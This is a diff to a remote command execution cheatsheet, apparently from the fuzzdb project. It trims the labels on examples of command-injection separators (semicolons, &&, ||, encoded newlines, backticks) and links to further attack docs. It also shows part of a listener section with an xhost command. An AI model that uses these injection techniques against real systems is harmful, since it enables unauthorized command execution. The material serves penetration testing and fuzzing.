@@ -1,31 +1,19 @@
 Remote Command Exec Cheatsheet
 
-File notes
-
-**source-disc-cmd-exec-traversal.fuzz.txt**
-usage<br>
-```GET /path/*payload*relative/path/to/target/file/```
-
 **Executing Commands**
-Seperating Commands<br>
+Various ways of separating Commands:<br>
 ``` blah;blah2 ```
 
-PIPES<br>
 ``` blah ^ blah 2```
 
-AND <br>
 ```blah && blah2```
 
-OR<br>
 ```FAIL || X```
 
-OR <br>
 ``` blah%0Dblah2%0Dblah3 ```
 
-Backtick<br>
 ``` `blah` ```
 
-Background <br>
 ``` `blah & blah2` ```
 
 **Shell commands without spaces**
@@ -105,4 +93,4 @@ Listener:<br>
 ```$ xhost +targetip```
 
 
-<br>More docs: /docs/attack-docs/remote-cmd-exfiltration/<br>
+<br>More docs: [/docs/attack-docs/remote-cmd-exfiltration/](https://github.com/fuzzdb-project/fuzzdb/tree/master/docs/attack-docs/remote-cmd-exfiltration)<br>
